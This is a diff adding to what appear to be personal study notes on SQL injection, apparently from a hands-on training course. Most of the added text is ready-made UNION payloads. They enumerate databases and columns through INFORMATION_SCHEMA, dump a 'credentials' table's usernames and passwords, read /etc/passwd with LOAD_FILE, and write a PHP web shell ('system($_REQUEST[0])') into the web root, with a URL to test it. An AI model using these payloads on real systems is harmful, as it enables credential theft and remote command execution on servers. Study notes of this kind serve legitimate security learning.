@@ -159,3 +159,60 @@ cn' UNION select 1,2,3,4-- -
 *Note: It is very common that not every column will be displayed back to the user. This is the benefit of using numbers as our junk data, as it makes it easy to track which columns are printed, so we know at which column to place our query.*
 *Note: We can also use `@@version` in our SQL query in the place of a cloumn to get data from the database. In MSSQL it returns MSSQL version. Error with other DBMS. We can also try `user()` to get data about the user, etc.*
 
+## Database Enumeration
+The INFORMATION_SCHEMA database contains metadata about the databases and tables present on the server.
+
+To reference a table present in another DB, we can use the dot ‘.’ operator. For example, to SELECT a table users present in a database named my_database, we can use:
+```
+SELECT * FROM my_database.users;
+```
+The table SCHEMATA in the INFORMATION_SCHEMA database contains information about all databases on the server.
+```
+SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+```
+Potential payload:
+```
+cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+```
+We can find the current database with the SELECT database() query:
+```
+cn' UNION select 1,database(),2,3-- -
+```
+The TABLES table contains information about all tables throughout the database. This table contains multiple columns, but we are interested in the TABLE_SCHEMA and TABLE_NAME columns.
+Potential payload:
+```
+cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+```
+To dump the data of a table, we first need to find the column names in the table, which can be found in the COLUMNS table in the INFORMATION_SCHEMA database.
+Potentical payload:
+```
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+```
+AFter that to dump data in another database, you can use something like that:
+```
+cn' UNION select 1, username, password, 4 from dev.credentials-- -
+```
+Potential payload to check user privileges:
+```
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+```
+## Load Files
+If we have enough privileges to read local system files, we can use the LOAD_FILE() function which is used in MariaDB / MySQL to read data from files:
+```
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+```
+This can be potentially used to leak the application source code as well.
+If the page ends up rendering a HTML code within the browser we retrieved, the source can be viewed by hitting [Ctrl + U].<br>
+
+## Write Files
+Writing files if the privileges allow:
+```
+cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+```
+### Writing a Web Shell
+Potential payload:
+```
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+```
+Then we can test, in our browser with `http://SERVER_IP:PORT/shell.php?0=id`.
+
